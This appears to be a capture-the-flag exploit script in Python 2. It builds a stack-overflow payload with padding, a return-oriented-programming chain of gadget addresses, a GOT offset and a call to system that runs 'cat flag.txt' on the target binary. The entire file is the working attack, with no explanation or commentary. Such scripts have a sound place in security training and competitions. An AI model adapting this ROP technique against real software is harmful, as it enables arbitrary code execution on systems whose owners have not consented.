import struct 

g1 = 0x4006d1
g2 =0x4006da
g3 =  0x4006d3
g4 = 0x4006d0
got = 0x601030-0x10
sys= 0x400510
#p_d = 69104
p_d = 56608
payload = 1032*"A"+ struct.pack("<Q",g1) +struct.pack("<Q",got) + struct.pack("<Q",g2)+struct .pack("<Q",p_d)+struct.pack("<Q",g1)+struct.pack("<Q",0x18)+struct.pack("<Q",g3)+"cat flag.txt"+ "\x00"*12 +struct.pack("<Q",g4)+struct.pack("<Q",sys)
print payload  
